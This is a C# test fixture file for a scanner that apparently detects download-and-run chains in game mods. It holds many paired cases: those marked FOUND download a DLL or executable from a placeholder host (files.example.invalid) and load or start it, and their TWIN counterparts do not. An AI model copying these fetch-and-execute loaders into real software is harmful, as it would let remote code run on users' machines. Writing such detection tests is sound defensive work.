// Test libraries for the C# download-and-run chain. Every case is compiled alone
// (tests/build_csharp_fixtures.py defines one symbol per library); the scanner only
// reads the result. Addresses are under example.invalid, which does not exist.
using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Reflection;
using System.Threading;
using System.Threading.Tasks;
using UnityEngine;
using UnityEngine.Networking;

#if LIBNET              // a library of its own: a method that gives a download back
namespace Shared
{
    public static class Net
    {
        public static byte[] Fetch(string address) { return new WebClient().DownloadData(address); }
    }
}
#endif
#if LIBNET2             // another library with a method of the very same name - which reads a packaged file
namespace Shared
{
    public static class Net
    {
        public static byte[] Fetch(string address) { return File.ReadAllBytes("Mods/packaged.dll"); }
    }
}
#endif
#if LIBBASE             // a library that DEFINES a method named like the base library's loader, and a helper
                        // beside it that hands what it is given straight to that method: no reference
                        // table of this library names a load (the test scans it under the name mscorlib.dll)
namespace System.Reflection
{
    public class Assembly
    {
        public static Assembly Load(byte[] rawAssembly) { return null; }
    }
}
namespace Shared
{
    public static class Base
    {
        public static void Run(byte[] code) { System.Reflection.Assembly.Load(code); }
    }
}
#endif
#if LIBRUN              // a library of its own: a method that loads what it is handed
namespace Shared
{
    public static class Plug
    {
        public static void Run(byte[] code) { Assembly.Load(code); }
    }
}
#endif
#if LIBMAKE             // a library of its own: makes an object of a named type, with constructor arguments
                        // (the shape of Activator.CreateInstance -> AppDomain.CreateInstance; 2026-10-23)
namespace Shared
{
    public static class Maker
    {
        public static object Make(string assembly, string type, object[] args)
        {
            return AppDomain.CurrentDomain.CreateInstance(assembly, type, false, BindingFlags.Default, null, args, null, null);
        }
    }
}
#endif

namespace Fixture
{
#if LOAD_FOUND          // one method: the download is loaded
    public class Updater
    {
        public void Run()
        {
            var client = new WebClient();
            byte[] data = client.DownloadData("https://files.example.invalid/mod.dll");
            Assembly.Load(data).GetType("Mod.Main");
        }
    }
#endif
#if LOAD_TWIN           // the download is only saved; what is loaded is a file of the game
    public class Updater
    {
        public void Run()
        {
            var client = new WebClient();
            byte[] data = client.DownloadData("https://files.example.invalid/news.bin");
            File.WriteAllBytes("news.bin", data);
            Assembly.Load(File.ReadAllBytes("Mods/packaged.dll")).GetType("Mod.Main");
        }
    }
#endif
#if DROP_FOUND          // downloaded straight to a file, which is started
    public class Updater
    {
        public void Run()
        {
            string target = Path.Combine(Path.GetTempPath(), "setup.exe");
            new WebClient().DownloadFile("https://files.example.invalid/setup.exe", target);
            Process.Start(target);
        }
    }
#endif
#if DROP_TWIN           // downloaded to one file; another file, of the game, is started
    public class Updater
    {
        public void Run()
        {
            string target = Path.Combine(Path.GetTempPath(), "notes.txt");
            new WebClient().DownloadFile("https://files.example.invalid/notes.txt", target);
            Process.Start("Tools\\config.exe");
        }
    }
#endif
#if WRITE_FOUND         // downloaded, written with File.WriteAllBytes, started through a ProcessStartInfo
    public class Updater
    {
        public void Run()
        {
            byte[] data = new WebClient().DownloadData("https://files.example.invalid/tool.exe");
            string target = Path.Combine(Path.GetTempPath(), "tool.exe");
            File.WriteAllBytes(target, data);
            var info = new ProcessStartInfo { FileName = target, UseShellExecute = false };
            Process.Start(info);
        }
    }
#endif
#if WRITE_TWIN          // what is written and started is made here; the download is only shown
    public class Updater
    {
        public void Run()
        {
            string news = new WebClient().DownloadString("https://files.example.invalid/news.txt");
            Console.WriteLine(news);
            string target = Path.Combine(Path.GetTempPath(), "run.cmd");
            File.WriteAllText(target, "echo hello");
            var info = new ProcessStartInfo { FileName = target, UseShellExecute = false };
            Process.Start(info);
        }
    }
#endif
#if COROUTINE_FOUND     // Unity's usual form: a coroutine downloads, then loads what came
    public class Loader : MonoBehaviour
    {
        public void Begin() { StartCoroutine(Fetch("https://files.example.invalid/patch.bytes")); }

        IEnumerator Fetch(string address)
        {
            UnityWebRequest request = UnityWebRequest.Get(address);
            yield return request.SendWebRequest();
            byte[] code = request.downloadHandler.data;
            yield return null;
            Assembly.Load(code);
        }
    }
#endif
#if COROUTINE_TWIN      // the coroutine downloads a text and shows it; the library it loads is packaged
    public class Loader : MonoBehaviour
    {
        public void Begin() { StartCoroutine(Fetch("https://files.example.invalid/news.txt")); }

        IEnumerator Fetch(string address)
        {
            UnityWebRequest request = UnityWebRequest.Get(address);
            yield return request.SendWebRequest();
            string news = request.downloadHandler.text;
            yield return null;
            UnityEngine.Debug.Log(news);
            Assembly.Load(Resources.Load<TextAsset>("packaged").bytes);
        }
    }
#endif
#if ASYNC_FOUND         // an async method: the awaited download is loaded
    public class Loader
    {
        static readonly HttpClient Client = new HttpClient();

        public async Task Fetch(string address)
        {
            byte[] code = await Client.GetByteArrayAsync(address);
            await Task.Delay(10);
            Assembly.Load(code);
        }
    }
#endif
#if ASYNC_TWIN          // the awaited download is saved; a program of the game is started
    public class Loader
    {
        static readonly HttpClient Client = new HttpClient();

        public async Task Fetch(string address)
        {
            byte[] page = await Client.GetByteArrayAsync(address);
            await Task.Delay(10);
            File.WriteAllBytes("cache.bin", page);
            Process.Start("Tools\\config.exe");
        }
    }
#endif
#if FIELD_FOUND         // two methods of one class: one downloads into a field, the other loads it
    public class Plugins
    {
        byte[] payload;
        byte[] packaged;

        public void Prepare()
        {
            payload = new WebClient().DownloadData("https://files.example.invalid/plugin.dll");
            packaged = File.ReadAllBytes("Mods/packaged.dll");
        }

        public void Start() { Assembly.Load(payload); }
    }
#endif
#if FIELD_TWIN          // the same class; the field that is loaded holds a file of the game
    public class Plugins
    {
        byte[] payload;
        byte[] packaged;

        public void Prepare()
        {
            payload = new WebClient().DownloadData("https://files.example.invalid/news.bin");
            packaged = File.ReadAllBytes("Mods/packaged.dll");
        }

        public void Start() { Assembly.Load(packaged); Console.WriteLine(payload.Length); }
    }
#endif
#if LAMBDA_FOUND        // an event handler written as a lambda loads what the event brings
    public class Updater
    {
        public void Run()
        {
            var client = new WebClient();
            string type = "Mod.Main";
            client.DownloadDataCompleted += (sender, e) => Assembly.Load(e.Result).GetType(type);
            client.DownloadDataAsync(new Uri("https://files.example.invalid/mod.dll"));
        }
    }
#endif
#if LAMBDA_TWIN         // the handler saves what the event brings
    public class Updater
    {
        public void Run()
        {
            var client = new WebClient();
            string name = "news.bin";
            client.DownloadDataCompleted += (sender, e) => File.WriteAllBytes(name, e.Result);
            client.DownloadDataAsync(new Uri("https://files.example.invalid/news.bin"));
        }
    }
#endif
#if STREAM_FOUND        // a response stream copied into a file, which is started
    public class Updater
    {
        public void Run()
        {
            string target = Path.Combine(Path.GetTempPath(), "patcher.exe");
            WebRequest request = WebRequest.Create("https://files.example.invalid/patcher.exe");
            using (WebResponse response = request.GetResponse())
            using (Stream body = response.GetResponseStream())
            using (FileStream file = File.Create(target))
            {
                byte[] buffer = new byte[4096];
                int count;
                while ((count = body.Read(buffer, 0, buffer.Length)) > 0)
                    file.Write(buffer, 0, count);
            }
            Process.Start(target);
        }
    }
#endif
#if STREAM_TWIN         // the stream is copied into memory and measured; nothing is started
    public class Updater
    {
        public long Run()
        {
            WebRequest request = WebRequest.Create("https://files.example.invalid/page.html");
            using (WebResponse response = request.GetResponse())
            using (Stream body = response.GetResponseStream())
            using (MemoryStream memory = new MemoryStream())
            {
                body.CopyTo(memory);
                Process.Start("Tools\\config.exe");
                return memory.Length;
            }
        }
    }
#endif
#if LOCAL_TWIN          // a download from this PC is no chain, as in the other languages
    public class Updater
    {
        public void Run()
        {
            byte[] data = new WebClient().DownloadData("http://127.0.0.1:8080/mod.dll");
            Assembly.Load(data);
        }
    }
#endif
// ---- step 2 (2026-10-11): between methods, delegates, between libraries -------------------
#if RETURN_FOUND        // one method gives the download back, another loads it
    public class Updater
    {
        byte[] Fetch() { return new WebClient().DownloadData("https://files.example.invalid/mod.dll"); }

        public void Run() { Assembly.Load(Fetch()); }
    }
#endif
#if RETURN_TWIN         // the download that is given back is only measured; what is loaded is packaged
    public class Updater
    {
        byte[] Fetch() { return new WebClient().DownloadData("https://files.example.invalid/news.bin"); }

        byte[] Packaged() { return File.ReadAllBytes("Mods/packaged.dll"); }

        public void Run() { Console.WriteLine(Fetch().Length); Assembly.Load(Packaged()); }
    }
#endif
#if ARG_TWIN            // the method that loads is handed a packaged file; the download goes to one that saves
    public class Updater
    {
        public void Run()
        {
            Save(new WebClient().DownloadData("https://files.example.invalid/news.bin"));
            Use(File.ReadAllBytes("Mods/packaged.dll"));
        }

        void Save(byte[] data) { File.WriteAllBytes("news.bin", data); }

        void Use(byte[] data) { Assembly.Load(data); }
    }
#endif
#if DEPTH4_FOUND        // four hand-overs between methods: the limit
    public class Updater
    {
        public void Run() { A(new WebClient().DownloadData("https://files.example.invalid/mod.dll")); }
        void A(byte[] d) { B(d); }
        void B(byte[] d) { C(d); }
        void C(byte[] d) { D(d); }
        void D(byte[] d) { Assembly.Load(d); }
    }
#endif
#if DEPTH5_STOP         // five hand-overs: one more than is followed
    public class Updater
    {
        public void Run() { A(new WebClient().DownloadData("https://files.example.invalid/mod.dll")); }
        void A(byte[] d) { B(d); }
        void B(byte[] d) { C(d); }
        void C(byte[] d) { D(d); }
        void D(byte[] d) { E(d); }
        void E(byte[] d) { Assembly.Load(d); }
    }
#endif
#if CLASS_FOUND         // handed to another class through its constructor, which keeps it in a field
    public class Worker
    {
        readonly byte[] code;
        public Worker(byte[] code) { this.code = code; }
        public void Run() { Assembly.Load(code); }
    }
    public class Updater
    {
        public void Run() { new Worker(new WebClient().DownloadData("https://files.example.invalid/mod.dll")).Run(); }
    }
#endif
#if CLASS_TWIN          // the other class is handed a packaged file
    public class Worker
    {
        readonly byte[] code;
        public Worker(byte[] code) { this.code = code; }
        public void Run() { Assembly.Load(code); }
    }
    public class Updater
    {
        public void Run()
        {
            Console.WriteLine(new WebClient().DownloadString("https://files.example.invalid/news.txt"));
            new Worker(File.ReadAllBytes("Mods/packaged.dll")).Run();
        }
    }
#endif
#if TASK_FOUND          // Task.Run with a lambda that uses the download
    public class Updater
    {
        public void Run()
        {
            byte[] data = new WebClient().DownloadData("https://files.example.invalid/mod.dll");
            Task.Run(() => Assembly.Load(data));
        }
    }
#endif
#if TASK_TWIN           // the lambda saves it
    public class Updater
    {
        public void Run()
        {
            byte[] data = new WebClient().DownloadData("https://files.example.invalid/news.bin");
            Task.Run(() => File.WriteAllBytes("news.bin", data));
        }
    }
#endif
#if THREAD_FOUND        // a thread is started on a method and handed the download
    public class Updater
    {
        public void Run()
        {
            byte[] data = new WebClient().DownloadData("https://files.example.invalid/mod.dll");
            new Thread(Work).Start(data);
        }

        void Work(object state) { Assembly.Load((byte[])state); }
    }
#endif
#if THREAD_TWIN         // the thread's method saves what it is handed
    public class Updater
    {
        public void Run()
        {
            byte[] data = new WebClient().DownloadData("https://files.example.invalid/news.bin");
            new Thread(Work).Start(data);
            Assembly.Load(File.ReadAllBytes("Mods/packaged.dll"));
        }

        void Work(object state) { File.WriteAllBytes("news.bin", (byte[])state); }
    }
#endif
#if POOL_FOUND          // ThreadPool.QueueUserWorkItem hands the download to a method
    public class Updater
    {
        public void Run()
        {
            byte[] data = new WebClient().DownloadData("https://files.example.invalid/mod.dll");
            ThreadPool.QueueUserWorkItem(Work, data);
        }

        static void Work(object state) { Assembly.Load((byte[])state); }
    }
#endif
#if POOL_TWIN           // the method is handed the name of a packaged file
    public class Updater
    {
        public void Run()
        {
            Console.WriteLine(new WebClient().DownloadString("https://files.example.invalid/news.txt"));
            ThreadPool.QueueUserWorkItem(Work, "Mods/packaged.dll");
        }

        static void Work(object state) { Assembly.Load(File.ReadAllBytes((string)state)); }
    }
#endif
#if CONTINUE_FOUND      // a continuation loads what the task before it downloaded
    public class Loader
    {
        static readonly HttpClient Client = new HttpClient();

        public void Fetch(string address)
        {
            Client.GetByteArrayAsync(address).ContinueWith(done => Assembly.Load(done.Result));
        }
    }
#endif
#if CONTINUE_TWIN       // the continuation measures it
    public class Loader
    {
        static readonly HttpClient Client = new HttpClient();

        public void Fetch(string address)
        {
            Client.GetByteArrayAsync(address).ContinueWith(done => Console.WriteLine(done.Result.Length));
            Assembly.Load(File.ReadAllBytes("Mods/packaged.dll"));
        }
    }
#endif
#if STARTCO_FOUND       // one coroutine downloads and starts a second one with what came
    public class Loader : MonoBehaviour
    {
        IEnumerator Fetch(string address)
        {
            UnityWebRequest request = UnityWebRequest.Get(address);
            yield return request.SendWebRequest();
            StartCoroutine(Apply(request.downloadHandler.data));
        }

        IEnumerator Apply(byte[] code)
        {
            yield return null;
            Assembly.Load(code);
        }
    }
#endif
#if STARTCO_TWIN        // the second coroutine is started with a packaged asset
    public class Loader : MonoBehaviour
    {
        IEnumerator Fetch(string address)
        {
            UnityWebRequest request = UnityWebRequest.Get(address);
            yield return request.SendWebRequest();
            UnityEngine.Debug.Log(request.downloadHandler.text);
            StartCoroutine(Apply(Resources.Load<TextAsset>("packaged").bytes));
        }

        IEnumerator Apply(byte[] code)
        {
            yield return null;
            Assembly.Load(code);
        }
    }
#endif
#if DELEGATE_FOUND      // a method kept in a delegate is called with the download
    public class Updater
    {
        public void Run()
        {
            Action<byte[]> use = Load;
            use(new WebClient().DownloadData("https://files.example.invalid/mod.dll"));
        }

        static void Load(byte[] data) { Assembly.Load(data); }
    }
#endif
#if DELEGATE_TWIN       // the delegate holds a method that saves
    public class Updater
    {
        public void Run()
        {
            Action<byte[]> use = Save;
            use(new WebClient().DownloadData("https://files.example.invalid/news.bin"));
        }

        static void Save(byte[] data) { File.WriteAllBytes("news.bin", data); }

        static void Load(byte[] data) { Assembly.Load(data); }
    }
#endif
#if XUSE_GIVES          // another library (LIBNET) downloads; this one loads what it gives back
    public class Updater
    {
        public void Run() { Assembly.Load(Shared.Net.Fetch("https://files.example.invalid/mod.dll")); }
    }
#endif
#if XUSE2_GIVES         // the same code as XUSE_GIVES, compiled against LIBNET2: it refers to the harmless one
    public class Updater
    {
        public void Run() { Assembly.Load(Shared.Net.Fetch("https://files.example.invalid/mod.dll")); }
    }
#endif
#if XUSE_BASE           // the game hands a download to the helper inside LIBBASE
    public class Updater
    {
        public void Run() { Shared.Base.Run(new WebClient().DownloadData("https://files.example.invalid/mod.dll")); }
    }
#endif
#if PSI_FOUND           // a Process object whose StartInfo is filled in, then started without arguments
    public class Updater
    {
        public void Run()
        {
            string target = Path.Combine(Path.GetTempPath(), "setup.exe");
            new WebClient().DownloadFile("https://files.example.invalid/setup.exe", target);
            var process = new Process();
            process.StartInfo.FileName = target;
            process.StartInfo.UseShellExecute = false;
            process.Start();
        }
    }
#endif
#if PSI_TWIN            // the same, started on a program of the game
    public class Updater
    {
        public void Run()
        {
            string target = Path.Combine(Path.GetTempPath(), "notes.txt");
            new WebClient().DownloadFile("https://files.example.invalid/notes.txt", target);
            var process = new Process();
            process.StartInfo.FileName = "Tools\\config.exe";
            process.StartInfo.UseShellExecute = false;
            process.Start();
        }
    }
#endif
#if PSI2_FOUND          // a ProcessStartInfo made from the downloaded file's path and set on the Process
    public class Updater
    {
        public void Run()
        {
            string target = Path.Combine(Path.GetTempPath(), "setup.exe");
            new WebClient().DownloadFile("https://files.example.invalid/setup.exe", target);
            var process = new Process();
            process.StartInfo = new ProcessStartInfo(target, "/S");
            process.Start();
        }
    }
#endif
#if ACTIVATOR_FOUND     // Activator.CreateInstanceFrom on a downloaded file
    public class Updater
    {
        public void Run()
        {
            string target = Path.Combine(Path.GetTempPath(), "mod.dll");
            new WebClient().DownloadFile("https://files.example.invalid/mod.dll", target);
            Activator.CreateInstanceFrom(target, "Mod.Main");
        }
    }
#endif
#if ACTIVATOR_TWIN      // ... on a library of the game
    public class Updater
    {
        public void Run()
        {
            string target = Path.Combine(Path.GetTempPath(), "news.bin");
            new WebClient().DownloadFile("https://files.example.invalid/news.bin", target);
            Activator.CreateInstanceFrom("Mods\\packaged.dll", "Mod.Main");
        }
    }
#endif
#if APPDOMAIN_FOUND     // AppDomain.ExecuteAssembly on a downloaded file
    public class Updater
    {
        public void Run()
        {
            string target = Path.Combine(Path.GetTempPath(), "tool.exe");
            File.WriteAllBytes(target, new WebClient().DownloadData("https://files.example.invalid/tool.exe"));
            AppDomain.CurrentDomain.ExecuteAssembly(target);
        }
    }
#endif
#if XUSE_RUNS           // this library downloads and hands it to another library (LIBRUN), which loads it
    public class Updater
    {
        public void Run() { Shared.Plug.Run(new WebClient().DownloadData("https://files.example.invalid/mod.dll")); }
    }
#endif
#if XUSE_TWIN           // both libraries are used, but the download is measured and a packaged file is run
    public class Updater
    {
        public void Run()
        {
            Console.WriteLine(Shared.Net.Fetch("https://files.example.invalid/news.bin").Length);
            Shared.Plug.Run(File.ReadAllBytes("Mods/packaged.dll"));
        }
    }
#endif
#if ACROSS_MISSED       // (step 1: not followed; found since step 2) an argument between two methods
    public class Updater
    {
        public void Run() { Use(new WebClient().DownloadData("https://files.example.invalid/mod.dll")); }

        void Use(byte[] data) { Assembly.Load(data); }
    }
#endif
#if CTORARG_TWIN        // (2026-10-23) the download is a constructor argument; the type made is a constant one
    public class Updater
    {
        public void Run()
        {
            byte[] data = new WebClient().DownloadData("https://files.example.invalid/news.bin");
            Make(new object[] { data });
        }

        void Make(object[] args)
        {
            AppDomain.CurrentDomain.CreateInstance("Game", "Game.News", false, BindingFlags.Default, null, args, null, null);
        }
    }
#endif
#if CTORARG_FOUND       // ... the download names the assembly that is made from
    public class Updater
    {
        public void Run()
        {
            string name = new WebClient().DownloadString("https://files.example.invalid/name.txt");
            Make(name, new object[0]);
        }

        void Make(string assembly, object[] args)
        {
            AppDomain.CurrentDomain.CreateInstance(assembly, "Mod.Main", false, BindingFlags.Default, null, args, null, null);
        }
    }
#endif
#if XUSE_CTORARG_TWIN   // across two libraries (LIBMAKE): the download goes in as a constructor argument
    public class Updater
    {
        public void Run()
        {
            Shared.Maker.Make("Game", "Game.News", new object[] { new WebClient().DownloadData("https://files.example.invalid/news.bin") });
        }
    }
#endif
#if XUSE_CTORARG_FOUND  // ... the download goes in as the assembly's name
    public class Updater
    {
        public void Run()
        {
            Shared.Maker.Make(new WebClient().DownloadString("https://files.example.invalid/name.txt"), "Mod.Main", null);
        }
    }
#endif
}
